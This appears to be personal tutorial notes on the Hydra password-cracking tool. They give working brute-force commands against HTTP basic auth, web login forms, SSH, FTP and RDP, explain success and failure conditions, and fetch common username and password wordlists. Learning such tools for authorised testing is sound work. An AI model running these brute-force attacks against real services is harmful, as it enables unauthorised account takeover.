Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications HTTP,  SSH and FTP, and even databases.
```shell-session
$ sudo apt-get -y update
 sudo apt-get -y install hydra 
```

```shell-session
hydra [login_options] [password_options] [attack_options] [service_options]
```

![](Pasted%20image%2020250618202043.png)
# Basic HTTP Authentication
```http
Authorization: Basic YWxpY2U6c2VjcmV0MTIz

<http-get />
```

## Hydra Services

Hydra services essentially define the specific protocols or services that Hydra can target. They enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services.

Each module is designed to understand a particular protocol's communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses. Below is a table of commonly used services:

|               |                   |                                                                                                   |                                                                                                             |
| ------------- | ----------------- | ------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| http-get/post | HTTP Web Services | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests. | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorre` |
|               |                   |                                                                                                   |                                                                                                             |

and for the rest its just `<protocol>://IP`

![](Pasted%20image%2020250618202452.png)

# brute http
```shell-session
$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
This command instructs Hydra to:

- Use the list of usernames from the `usernames.txt` file.
- Use the list of passwords from the `passwords.txt` file.
- Target the website `www.example.com`.
- Employ the `http-get` module to test the HTTP authentication.

### Targeting Multiple SSH Servers
```shell-session
$ hydra -l root -p toor -M targets.txt ssh

# This command instructs Hydra to:

- Use the username "root".
- Use the password "toor".
- Target all IP addresses listed in the `targets.txt` file.
- Employ the `ssh` module for the attack.

Hydra will execute parallel brute-force attempts on each server, significantly speeding up the process.
```
### Testing FTP Credentials on a Non-Standard Port

```shell-session
hydra -L usernames.txt -P passwords.txt -s <PORT> -V ftp.example.com ftp
```

# WEB FORM
```shell-session
$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# - Use the username "admin".
- Use the list of passwords from the `passwords.txt` file.
- Target the login form at `/login` on `www.example.com`.
- Employ the `http-post-form` module with the specified form parameters.
- Look for a successful login indicated by the HTTP status code `302`.
```

# Advanced RDP Brute-Forcing


Now, imagine you're testing a Remote Desktop Protocol (RDP) service on a server with IP `192.168.1.100`. You suspect the username is "administrator," and that the password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers. To carry out this precise attack, use the following Hydra command:

```shell-session
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

- Use the username "administrator".
- Generate and test passwords ranging from 6 to 8 characters, using the specified character set.
- Target the RDP service on `192.168.1.100`.
- Employ the `rdp` module for the attack.
```
	

# basic password brute (dict)
```
$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.59.174 http-get /<login> -s 50480
```
![](Pasted%20image%2020250618232500.png)

# form submission
Hydra's `http-post-form` service is specifically designed to target login forms. It enables the automation of POST requests, dynamically inserting username and password combinations into the request body.

The general structure of a Hydra command using `http-post-form` looks like this:

```shell-session
 hydra [options] target http-post-form "path:params:condition_string"
```

# Fail and success conditions

In Hydraâ€™s `http-post-form` module, success and failure conditions are crucial for properly identifying valid and invalid login attempts.  (`F=...`) to determine when a login attempt has failed, specify a success condition (`S=...`) to indicate when a login is successful.

The failure condition (`F=...`) is used to check for a specific string in the server's response that signals a failed login attempt. This is the most common approach because many websites return an error message (like "Invalid username or password") when the login fails. For example, if a login form returns the message "Invalid credentials" on a failed attempt, you can configure Hydra like this:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```
In this case, Hydra will check each response for the string "Invalid credentials." If it finds this phrase, it will mark the login attempt as a failure and move on to the next username/password pair.
however, sometimes this is not the case as web apps tend to differ from eachother with how they deal with requests, for example the web app may redirect you (302 status code)

so we should firstly test out different responses like:
`wrong pass`, `correct pass`, `check  behavior after response` ...etc

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
login results in content like "Dashboard" appearing on the page, you can configure Hydra to look for that keyword as a success condition:
```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

### Manual Inspection

```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```

The HTML reveals a simple login form. Key points for Hydra:

- `Method`: `POST` - Hydra will need to send POST requests to the server.
- Fields:
    - `Username`: The input field named `username` will be targeted.
    - `Password`: The input field named `password` will be targeted.
With these details, you can construct the Hydra command to automate the brute-force attack against this login form.
### Proxy Interception

For more complex scenarios, intercepting the network traffic with a proxy tool like Burp Suite or OWASP ZAP can be invaluable. Configure your browser to route its traffic through the proxy, then interact with the login form. The proxy will capture the POST request, allowing you to dissect its every component, including the precise login parameters and their values.
# crafting the arguments
After analyzing the login form's structure and behavior, it's time to build the `params` string, a critical component of Hydra's `http-post-form` attack module. This string encapsulates the data that will be sent to the server with each login attempt, mimicking a legitimate form submission.

The `params` string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.

- `Form Parameters`: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (`^USER^` and `^PASS^`) within these parameters with values from your wordlists.
- `Additional Fields`: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the `params` string. These can have static values or dynamic placeholders if their values change with each request.
- `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like `S=302` for a redirect) or the presence or absence of specific text in the server's response (e.g., `F=Invalid credentials` or `S=Welcome`).
Therefore, our `params` string would be:
```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

example
```shell-session
# Download wordlists if needed
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
# Hydra command
$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
